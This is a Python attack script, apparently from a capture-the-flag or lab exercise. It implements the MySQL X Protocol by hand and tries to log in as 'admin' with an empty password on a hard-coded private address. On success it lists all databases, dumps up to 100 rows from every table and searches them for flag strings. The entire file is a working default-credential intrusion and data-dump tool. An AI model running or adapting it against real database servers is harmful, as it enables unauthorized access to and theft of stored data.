import hashlib
import json
import re
import socket
import struct
import sys

HOST = "192.168.2.254"
PORT = 33060
TIMEOUT = 5.0
MAX_FRAME = 16 * 1024 * 1024


def varint(value):
    out = bytearray()
    while value > 127:
        out.append((value & 127) | 128)
        value >>= 7
    out.append(value)
    return bytes(out)


def field_bytes(number, value):
    return varint((number << 3) | 2) + varint(len(value)) + value


def field_string(number, value):
    return field_bytes(number, value.encode("utf-8"))


def field_int(number, value):
    return varint(number << 3) + varint(value)


def parse_fields(data):
    fields = []
    pos = 0

    def read_varint():
        nonlocal pos
        value = shift = 0
        while pos < len(data):
            b = data[pos]
            pos += 1
            value |= (b & 127) << shift
            if not b & 128:
                return value
            shift += 7
            if shift > 70:
                raise ValueError("protobuf varint is too long")
        raise ValueError("truncated protobuf varint")

    while pos < len(data):
        key = read_varint()
        number, wire = key >> 3, key & 7
        if not number:
            raise ValueError("invalid protobuf field number")
        if wire == 0:
            value = read_varint()
        elif wire == 1:
            if pos + 8 > len(data):
                raise ValueError("truncated fixed64 field")
            value = data[pos:pos + 8]
            pos += 8
        elif wire == 2:
            length = read_varint()
            if length > len(data) - pos:
                raise ValueError("truncated length-delimited field")
            value = data[pos:pos + length]
            pos += length
        elif wire == 5:
            if pos + 4 > len(data):
                raise ValueError("truncated fixed32 field")
            value = data[pos:pos + 4]
            pos += 4
        else:
            raise ValueError("unsupported protobuf wire type %d" % wire)
        fields.append((number, wire, value))
    return fields


def text(data):
    return data.decode("utf-8", "replace")


def quote_ident(value):
    return "`" + value.replace("`", "``") + "`"


class XConnection:
    def __init__(self, sock):
        self.sock = sock
        self.events = []

    def send(self, msg_type, payload=b""):
        body = bytes([msg_type]) + payload
        self.sock.sendall(struct.pack("<I", len(body)) + body)
        self.events.append({"direction": "client_to_server", "type": msg_type,
                            "payload_hex": payload[:256].hex(),
                            "payload_truncated": len(payload) > 256})

    def receive(self):
        header = self._read_exact(4)
        length = struct.unpack("<I", header)[0]
        if length < 1 or length > MAX_FRAME:
            raise ValueError("invalid or excessive X Protocol frame length: %d" % length)
        body = self._read_exact(length)
        msg_type, payload = body[0], body[1:]
        event = {"direction": "server_to_client", "type": msg_type,
                 "payload_hex": payload[:512].hex(),
                 "payload_truncated": len(payload) > 512}
        try:
            fields = parse_fields(payload)
            event["fields"] = [
                {"number": n, "wire": w,
                 "value": (v if w == 0 else (text(v) if n in (2, 3, 4, 5, 6) and msg_type == 1 else v.hex()))}
                for n, w, v in fields
            ]
            if msg_type == 1:
                for n, w, v in fields:
                    if n == 2 and w == 2:
                        event["error_message"] = text(v)
                    elif n == 1 and w == 0:
                        event["error_code"] = v
                    elif n == 3 and w == 2:
                        event["sql_state"] = text(v)
        except Exception as exc:
            event["parse_error"] = str(exc)
        self.events.append(event)
        return msg_type, payload, event

    def _read_exact(self, count):
        chunks = []
        while count:
            chunk = self.sock.recv(count)
            if not chunk:
                raise EOFError("connection closed while reading an X Protocol frame")
            chunks.append(chunk)
            count -= len(chunk)
        return b"".join(chunks)


def scalar_value(encoded):
    """Decode a common Mysqlx.Datatypes.Any/Scalar row cell to a display value."""
    try:
        any_fields = parse_fields(encoded)
        scalar_data = next((v for n, w, v in any_fields if n == 2 and w == 2), None)
        if scalar_data is None:
            return {"raw_hex": encoded[:128].hex()}
        scalar_fields = parse_fields(scalar_data)
        typ = next((v for n, w, v in scalar_fields if n == 1 and w == 0), None)
        for n, w, v in scalar_fields:
            if n == 5 and w == 2:  # Scalar.OCTETS
                octets = parse_fields(v)
                raw = next((x for fn, fw, x in octets if fn == 1 and fw == 2), b"")
                return text(raw)
            if n == 2 and w == 0:
                return v
            if n == 3 and w == 0:
                return v
            if n == 4 and w == 0:
                return None
            if n == 6 and w == 1:
                return struct.unpack("<d", v)[0]
            if n == 7 and w == 0:
                return bool(v)
        return {"scalar_type": typ, "raw_hex": encoded[:128].hex()}
    except Exception:
        return {"raw_hex": encoded[:128].hex()}


def execute_query(conn, sql):
    payload = field_string(1, sql) + field_int(3, 1)
    conn.send(12, payload)  # Mysqlx.ClientMessages.StmtExecute
    columns = []
    rows = []
    errors = []
    terminal = None
    while True:
        msg_type, body, event = conn.receive()
        if msg_type == 1:
            errors.append(event)
            terminal = "error"
            break
        if msg_type == 12:  # Resultset.ColumnMetaData
            try:
                fs = parse_fields(body)
                name = next((text(v) for n, w, v in fs if n == 2 and w == 2), "")
                columns.append(name)
            except Exception:
                columns.append("")
        elif msg_type == 13:  # Resultset.Row
            try:
                cells = [scalar_value(v) for n, w, v in parse_fields(body) if n == 1 and w == 2]
                rows.append(cells)
            except Exception as exc:
                rows.append({"parse_error": str(exc), "payload_hex": body[:256].hex()})
        elif msg_type == 14:  # Resultset.FetchDone
            continue
        elif msg_type == 17:  # StmtExecuteOk
            terminal = "statement_ok"
            break
        elif msg_type == 11:  # Notice; record it, then continue for result/terminal frames
            continue
        else:
            if len(conn.events) > 0:
                event["unexpected_during_query"] = sql
            if msg_type in (4, 5):
                continue
            terminal = "unexpected_server_message_%d" % msg_type
            break
    return {"sql": sql, "columns": columns, "rows": rows,
            "terminal": terminal, "errors": errors}


def main():
    result = {
        "target": "%s:%d" % (HOST, PORT),
        "protocol_basis": "Observed MySQL X Protocol fingerprint; MYSQL41 and SHA256_MEMORY advertised",
        "authentication_attempt": {"username": "admin", "password_test": "empty password only"},
        "authenticated": False,
        "queries": [],
        "events": [],
    }
    try:
        with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            conn = XConnection(sock)

            # X Protocol connection setup: request capabilities, then acknowledge
            # with an empty capability set (no TLS/compression options requested).
            conn.send(1, b"")  # CapabilitiesGet
            msg_type, payload, event = conn.receive()
            result["capabilities_response_type"] = msg_type
            if msg_type == 1:
                result["error"] = event.get("error_message", "server returned an error during capability exchange")
                result["events"] = conn.events
                print(json.dumps(result, ensure_ascii=False))
                return
            if msg_type != 2:
                result["error"] = "expected Capabilities response (type 2); received type %d" % msg_type
                result["events"] = conn.events
                print(json.dumps(result, ensure_ascii=False))
                return
            conn.send(3, b"")  # CapabilitiesSet, empty list
            msg_type, payload, event = conn.receive()
            result["capabilities_set_response_type"] = msg_type
            if msg_type == 1:
                result["error"] = event.get("error_message", "server rejected capability setup")
                result["events"] = conn.events
                print(json.dumps(result, ensure_ascii=False))
                return

            # MYSQL41 is explicitly present in the observed service fingerprint.
            # auth_data carries username and empty schema; only a blank-password
            # challenge response is attempted, never a password list.
            auth_data = b"admin\x00\x00"
            conn.send(4, field_string(1, "MYSQL41") + field_bytes(2, auth_data))
            msg_type, payload, event = conn.receive()
            if msg_type == 4:  # AuthOk
                result["authenticated"] = True
                result["authentication_result"] = "AuthOk received before a challenge"
            elif msg_type == 3:  # AuthContinue
                fs = parse_fields(payload)
                nonce = next((v for n, w, v in fs if n == 1 and w == 2), b"")
                result["challenge_received"] = True
                result["challenge_length"] = len(nonce)
                if not nonce:
                    result["authentication_result"] = "AuthContinue contained no usable challenge"
                else:
                    # MYSQL41: '*' + hex(SHA1(password) XOR SHA1(nonce + SHA1(SHA1(password))))
                    first = hashlib.sha1(b"").digest()
                    second = hashlib.sha1(first).digest()
                    third = hashlib.sha1(nonce + second).digest()
                    response = b"*" + bytes(a ^ b for a, b in zip(first, third)).hex().upper().encode("ascii")
                    conn.send(5, field_bytes(1, response))  # AuthenticateContinue
                    msg_type, payload, event = conn.receive()
                    if msg_type == 4:
                        result["authenticated"] = True
                        result["authentication_result"] = "AuthOk received for admin with empty password"
                    elif msg_type == 1:
                        result["authentication_result"] = "authentication rejected; credentials or authentication policy are a prerequisite"
                        result["authentication_error"] = event.get("error_message", "server Error response")
                        result["authentication_error_code"] = event.get("error_code")
                    else:
                        result["authentication_result"] = "inconclusive server response type %d after authentication response" % msg_type
            elif msg_type == 1:
                result["authentication_result"] = "authentication rejected or prerequisite required"
                result["authentication_error"] = event.get("error_message", "server Error response")
                result["authentication_error_code"] = event.get("error_code")
            else:
                result["authentication_result"] = "inconclusive server response type %d" % msg_type

            if result["authenticated"]:
                db_result = execute_query(conn, "SHOW DATABASES")
                result["queries"].append(db_result)
                databases = []
                for row in db_result["rows"]:
                    if isinstance(row, list) and row and isinstance(row[0], str):
                        databases.append(row[0])
                for database in databases:
                    table_result = execute_query(conn, "SHOW TABLES FROM " + quote_ident(database))
                    result["queries"].append(table_result)
                    tables = [row[0] for row in table_result["rows"]
                              if isinstance(row, list) and row and isinstance(row[0], str)]
                    for table in tables:
                        sql = "SELECT * FROM %s.%s LIMIT 100" % (quote_ident(database), quote_ident(table))
                        table_data = execute_query(conn, sql)
                        result["queries"].append(table_data)
                flag_pattern = re.compile(r"flag\s*\{|\bflag\b|\{[A-Za-z0-9_:-]{4,}\}", re.IGNORECASE)
                hits = []
                for query in result["queries"]:
                    for row_index, row in enumerate(query.get("rows", [])):
                        rendered = json.dumps(row, ensure_ascii=False)
                        if flag_pattern.search(rendered):
                            hits.append({"sql": query["sql"], "row_index": row_index, "row": row})
                result["flag_evidence"] = hits
                result["table_row_limit"] = 100
                result["coverage_note"] = "Only rows returned by the listed queries were examined; each table query is limited to 100 rows."
    except Exception as exc:
        result["execution_error"] = "%s: %s" % (type(exc).__name__, str(exc))
    if "conn" in locals():
        result["events"] = conn.events
    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()

